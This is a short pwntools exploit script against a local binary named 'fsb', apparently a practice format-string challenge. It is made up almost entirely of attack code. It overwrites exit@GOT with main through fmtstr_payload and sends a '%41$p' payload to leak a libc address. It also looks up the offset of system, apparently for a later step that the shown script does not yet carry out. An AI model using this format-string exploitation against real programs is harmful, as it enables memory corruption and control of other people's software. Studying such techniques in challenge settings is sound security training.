from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

context.arch = "amd64"
context.bits = 64
context.log_level = 'debug'

p = process("./fsb")
e = ELF("./fsb")
libc = e.libc

gdb.attach(p)

exit_got = e.got['exit']
printf_got = e.got['printf']
main = e.symbols['main']
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
libc_start_main = libc.symbols['__libc_start_main']


# [1] exit@got -> main
payload = fmtstr_payload(6, {exit_got:main})
p.send(payload)


# [2] libc base leak
payload = b'leak:%41$p'

pause()
p.sendline(payload)

p.interactive()
